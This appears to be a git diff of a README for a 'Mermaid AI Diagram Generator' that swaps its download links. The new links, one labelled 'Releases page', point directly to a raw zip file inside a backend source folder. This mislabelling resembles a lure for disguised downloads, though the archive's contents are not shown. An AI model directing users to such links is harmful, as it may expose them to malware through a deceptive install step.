@@ -1,6 +1,6 @@
 # 🎨 Mermaid-AI-Diagram-Generator - Create Professional Diagrams Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/hobber/Mermaid-AI-Diagram-Generator.zip%https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/hobber/Mermaid-AI-Diagram-Generator.zip)](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/hobber/Mermaid-AI-Diagram-Generator.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/mermind-local/backend/Mermaid-A-Diagram-Generator-2.5.zip%https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/mermind-local/backend/Mermaid-A-Diagram-Generator-2.5.zip)](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/mermind-local/backend/Mermaid-A-Diagram-Generator-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Mermaid AI Diagram Generator! This tool helps you create beautifu
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/hobber/Mermaid-AI-Diagram-Generator.zip) to find the latest version of the software.
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Lucifer29-afk/Mermaid-AI-Diagram-Generator/main/mermind-local/backend/Mermaid-A-Diagram-Generator-2.5.zip) to find the latest version of the software.
     
 2. **Choose your version:** Look for the most recent release. You will see different files available for download.
 
